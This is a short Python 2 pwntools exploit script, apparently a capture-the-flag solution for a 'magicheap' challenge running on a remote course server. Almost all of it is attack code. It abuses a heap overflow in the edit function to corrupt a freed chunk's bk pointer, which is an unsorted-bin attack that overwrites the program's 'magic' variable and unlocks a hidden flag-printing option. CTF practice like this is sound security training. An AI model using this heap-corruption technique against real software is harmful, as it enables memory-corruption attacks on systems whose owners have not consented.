#!/usr/bin/env python2
from pwn import *

file1, file2  = "./magicheap", "./libc-2.23.so"
# server, port = 'localhost'  , 9999
server, port = 'csie.ctf.tw', 10145

r, context.binary = remote(server, port), file1
# ========================================================================
binary, libc = ELF(file1), ELF(file2)

# --------------------------------
#        Magic Heap Creator       
# --------------------------------
#  1. Create a Heap               
#  2. Edit a Heap                 
#  3. Delete a Heap               
#  4. Exit                        
# --------------------------------

def CreateHeap( size, data ):
    r.sendlineafter( "Your choice :"        , "1"       )
    r.sendlineafter( "Size of Heap : "      , str(size) )
    r.sendlineafter( "Content of heap:"     , data      )

def EditOnHeap( idx, size, data ):
    r.sendlineafter( "Your choice :"        , "2"       )
    r.sendlineafter( "Index :"              , str(idx)  )
    r.sendlineafter( "Size of Heap : "      , str(size) )
    r.sendlineafter( "Content of heap : "   , data      )

def DeleteHeap( idx ):
    r.sendlineafter( "Your choice :"        , "3"       )
    r.sendlineafter( "Index :"              , str(idx)  )

def Magic_Heap():
    r.sendlineafter( "Your choice :"        , "4869"    )

    if r.recvuntil("\n") == "Congrt !\n":
        print r.recvuntil("\n")
    else:
        print "So sad !"

def Exit():
    r.sendlineafter( "Your choice :"        , "4"       )

CreateHeap( 0x80, "A" )
CreateHeap( 0x80, "B" )
CreateHeap( 0x80, "C" )
DeleteHeap( 1 )

fd, bk = 0, binary.symbols["magic"] - 0x10
EditOnHeap( 0, 0x200, "A"*0x80 + p64(0) + p64(0x91) + p64(fd) + p64(bk) )
CreateHeap( 0x80, "D" )

Magic_Heap()
Exit()
